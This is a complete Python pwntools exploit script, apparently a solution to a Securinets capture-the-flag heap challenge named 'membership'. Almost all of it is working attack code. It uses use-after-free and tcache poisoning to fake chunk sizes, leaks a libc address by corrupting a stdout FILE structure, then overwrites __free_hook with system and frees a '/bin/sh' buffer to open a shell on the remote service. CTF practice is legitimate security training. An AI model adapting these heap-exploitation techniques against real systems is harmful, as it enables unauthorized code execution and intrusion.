#!/usr/bin/python

from pwn import *
import sys

remote_ip, port = 'bin.q21.ctfsecurinets.com', 1339
binary = './membership'
brkpts = '''
'''

elf = ELF("membership")
#libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc = ELF("libc-2.31.so")

context.arch = "amd64"
#context.aslr = False

re = lambda a: io.recv(a)
reu = lambda a: io.recvuntil(a)
rl = lambda: io.recvline()
s = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla = lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

if len(sys.argv) > 1:
    io = remote(remote_ip, port)

else:
    io = process(binary, env = {"LD_PRELOAD" : "./libc-2.31.so"})

def choice(idx):
    sla(">", str(idx))

def sub():
    choice(1)

def unsub(idx):
    choice(2)
    sla("Index: ", str(idx))

def modify(idx, data):
    choice(3)
    sla("Index: ", str(idx))
    sa("Content: ", str(data))

if __name__ == "__main__":
    for i in range(20):
        sub()
    unsub(2)
    unsub(1)
    modify(3, p64(0)*5 + p64(0x61))
    modify(1, "\xf0")

    sub()
    sub()
    modify(2, p64(0)*5 + p64(0x421))

    unsub(4)
    modify(2, p64(0)*5 + p64(0x61))

    unsub(7)
    unsub(5)
    unsub(6)
    modify(6, "\x20")

    modify(4, "\xa0\xa6")

    for i in range(3):
        sub()

    #gdb.attach(io)

    payload = p64(0xfbad3887) + p64(0)*3 + "\x08"
    modify(6, payload)

    libc.address = u64(io.recv(6).ljust(8, "\x00")) - 0x1eb980
    system = libc.symbols['system']
    free_hook = libc.symbols['__free_hook']
    log.info("Libc -> "+hex(libc.address))

    unsub(19)
    unsub(18)
    unsub(17)
    
    modify(0, "/bin/sh\x00")
    modify(17, p64(free_hook))

    sub()
    sub()
    modify(17, p64(system))
    unsub(0)

    io.interactive()
